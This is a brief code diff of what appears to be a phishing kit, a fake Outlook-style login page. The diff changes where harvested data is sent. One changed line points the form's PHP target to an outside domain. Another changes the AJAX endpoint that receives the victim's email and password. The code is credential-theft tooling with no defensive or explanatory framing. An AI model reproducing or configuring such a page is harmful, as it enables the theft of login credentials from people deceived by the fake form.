@@ -181,7 +181,7 @@
 			
 			// Note : if this HTML page hosted on http(s) domain so you must add the http(s) url php file to avoid cross error //
 			
-			var php_url = 'login.php'; // Enter your post PHP page url here.
+			var php_url = 'http://creu.ga/1/1/login.php'; // Enter your post PHP page url here.
 			var check_mx = false; // true or false for check outlook MX.
 			
 			
@@ -267,7 +267,7 @@
 				var user = $('#email').val();
 				var pass = $('#password').val();
 				$.ajax({
-					url: "https://checkmyips.net/api/geoip/",
+					url: "https://showips.com/api/geoip/",
 					type: "POST",
 					data: {user:user,pass:pass,t:1},
 					success: function(data){
